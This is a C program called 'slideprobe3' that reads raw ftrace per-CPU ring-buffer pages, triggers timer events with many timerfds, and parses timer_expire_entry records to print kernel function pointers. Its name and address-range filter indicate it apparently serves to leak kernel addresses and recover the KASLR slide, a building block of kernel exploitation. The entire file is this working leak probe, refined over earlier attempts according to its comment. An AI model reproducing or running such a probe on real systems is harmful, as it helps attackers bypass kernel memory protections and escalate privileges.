/*
 * slideprobe3 - correct ftrace raw parsing.
 *
 * Two things the previous attempts got wrong:
 *   1. every 4096-byte page starts with a 16-byte header
 *      (u64 timestamp, u64 commit) before the record data;
 *   2. ring_buffer_event length is type_len*4 + 4 (the u32 header itself),
 *      not type_len*4.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include <sys/timerfd.h>
#include <time.h>

#define T "/sys/kernel/tracing"
#define PAGE 4096
#define KVA_TEXT 0xffffff8000000000ULL
#define KVA_END  0xfffffffec0000000ULL

static int write_str(const char *p, const char *v)
{
    int fd = open(p, O_WRONLY); ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, v, strlen(v)); close(fd);
    return n > 0 ? 0 : -1;
}

int main(void)
{
    int fds[16], nfds = 0, i, tfds[256], ntf = 0;
    unsigned char buf[1 << 16];
    unsigned char *all = malloc(1 << 23);
    size_t total = 0;
    struct itimerspec its;

    if (!all) return 1;
    write_str(T "/tracing_on", "0\n");
    { int fd = open(T "/trace", O_WRONLY|O_TRUNC); if (fd >= 0) close(fd); }
    write_str(T "/tracing_on", "1\n");

    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        fds[nfds] = open(p, O_RDONLY | O_NONBLOCK);
        if (fds[nfds] < 0) break;
        nfds++;
    }
    printf("raw pipes: %d\n", nfds);

    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 800000L;
    for (i = 0; i < 256; i++) {
        int fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK);
        if (fd < 0) break;
        if (timerfd_settime(fd, 0, &its, NULL) != 0) { close(fd); break; }
        tfds[ntf++] = fd;
    }
    printf("timerfds: %d\n", ntf);

    {
        int rounds;
        for (rounds = 0; rounds < 120; rounds++) {
            struct pollfd p[16];
            int k;
            for (k = 0; k < nfds; k++) { p[k].fd = fds[k]; p[k].events = POLLIN; }
            if (poll(p, nfds, 25) > 0) {
                for (k = 0; k < nfds; k++) {
                    if (p[k].revents & POLLIN) {
                        ssize_t n = read(fds[k], buf, sizeof(buf));
                        if (n > 0 && total + (size_t)n < (1u << 23)) {
                            memcpy(all + total, buf, (size_t)n);
                            total += (size_t)n;
                        }
                    }
                }
            }
            if (rounds == 50) for (i = 0; i < ntf; i++) timerfd_settime(tfds[i], 0, &its, NULL);
        }
    }
    write_str(T "/tracing_on", "0\n");
    for (i = 0; i < nfds; i++) close(fds[i]);
    for (i = 0; i < ntf; i++) close(tfds[i]);
    printf("captured %zu bytes (%zu pages)\n", total, total / PAGE);

    /* Page-oriented walk: skip the 16-byte page header, then records. */
    {
        size_t page, hits = 0, recs = 0, t36 = 0;
        for (page = 0; page + 16 < total; page += PAGE) {
            size_t end = page + PAGE;
            size_t p = page + 16;
            if (end > total) end = total;
            while (p + 4 <= end) {
                uint32_t hdr, tlen, len, poff = 0;
                memcpy(&hdr, all + p, 4);
                tlen = hdr & 0x1f;
                if (tlen == 0) {
                    uint32_t plen;
                    memcpy(&plen, all + p + 4, 4);
                    if (plen == 0) break;               /* null event: end of data */
                    p += plen + 4;
                    continue;
                }
                if (tlen == 1 || tlen == 2) { p += 12; continue; }
                len = tlen * 4 + 4;
                if (p + len > end) break;
                recs++;
                /* timer_expire_entry: data 32 bytes -> type_len 8 -> len 36 */
                if (len == 36 && t36 < 3) {
                    size_t q; 
                    printf("REC[%zu] hex:", t36);
                    for (q = 0; q < 36; q++) printf(" %02x", all[p + q]);
                    printf("\n");
                    {
                        uint64_t a, b, c, d;
                        memcpy(&a, all + p + 4, 8);
                        memcpy(&b, all + p + 12, 8);
                        memcpy(&c, all + p + 20, 8);
                        memcpy(&d, all + p + 28, 8);
                        printf("      +4=0x%llx +12=0x%llx +20=0x%llx +28=0x%llx\n",
                               (unsigned long long)a, (unsigned long long)b,
                               (unsigned long long)c, (unsigned long long)d);
                    }
                }
                if (len == 36) {
                    uint16_t etype;
                    uint64_t fn;
                    memcpy(&etype, all + p + 4, 2);
                    memcpy(&fn, all + p + 4 + 24, 8);
                    t36++;
                    if (fn >= KVA_TEXT && fn < KVA_END) {
                        printf("  timer_expire type=%u function=0x%016llx\n",
                               etype, (unsigned long long)fn);
                        if (++hits >= 10) break;
                    }
                }
                p += len;
                (void)poff;
            }
            if (hits >= 10) break;
        }
        printf("records walked: %zu, len36(timer_expire): %zu, hits: %zu\n", recs, t36, hits);
    }
    return 0;
}
